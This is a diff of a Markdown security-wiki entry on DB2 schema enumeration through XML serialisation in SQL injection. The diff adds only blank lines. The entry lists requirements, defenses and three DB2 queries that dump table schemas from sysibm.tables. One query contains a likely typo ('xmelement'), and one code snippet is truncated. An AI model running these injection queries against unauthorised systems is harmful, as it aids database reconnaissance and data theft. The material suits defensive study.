@@ -34,6 +34,8 @@ DB2 Schema Enumeration via XML Serialization is a technique used to extract meta
 
 From an offensive perspective, this technique can be used to identify sensitive information such as passwords, credit card numbers, and other confidential data. From a defensive perspective, understanding how attackers can use this technique can help organizations better secure their applications and databases.
 
+ 
+
 ## Requirements
 
 1. Access to the target application
@@ -41,6 +43,8 @@ From an offensive perspective, this technique can be used to identify sensitive 
 1. Knowledge of SQL injection techniques
 
 1. Ability to serialize database schema to XML format
+
+ 
 
 ## Defense
 
@@ -50,19 +54,31 @@ From an offensive perspective, this technique can be used to identify sensitive 
 
 1. Monitor database logs for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Identify the database schema of a target application
 
 1. Identify potential targets for further exploitation
 
+ 
+
 # Instructions
 
 1. To retrieve all table schemas in XML format, run any of the following SQL commands:
 
+ 
+
+
+
 **Code**: [[select xmlagg(xmlrow(table_schema)) from sysibm.ta]]
 
+
+
 > The first SQL command retrieves all table schemas in one XML-formatted string. The second command does the same but removes any repeated elements. The third command retrieves all table schemas in one XML-formatted string, but is only available in version 8 of the software. You may need to cast the result as varchar(500) to display the output.
+
+
 
 **Command** ([[Select all table schemas in one xml-formatted string]]):
 
@@ -70,17 +86,27 @@ From an offensive perspective, this technique can be used to identify sensitive 
 select xmlagg(xmlrow(table_schema)) from sysibm.tables -- returns all in one xml-formatted string
 ```
 
+
+
+
+
 **Command** ([[Select all table schemas in one xml-formatted string without repeated elements]]):
 
 ```bash
 select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) -- Same but without repeated elements
 ```
 
+
+
+
+
 **Command** ([[Select all table schemas in one xml-formatted string (v8)]]):
 
 ```bash
 select xml2clob(xmelement(name t, table_schema)) from sysibm.tables -- returns all in one xml-formatted string (v8). May need CAST(xml2clob(… AS varchar(500)) to display the result.
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -103,3 +129,5 @@ select xml2clob(xmelement(name t, table_schema)) from sysibm.tables -- returns a
 - [[DB2 Cheatsheet]]
 - [[DB2 Injection]]
 - [[Serialize to XML (for error based)]]
+
+
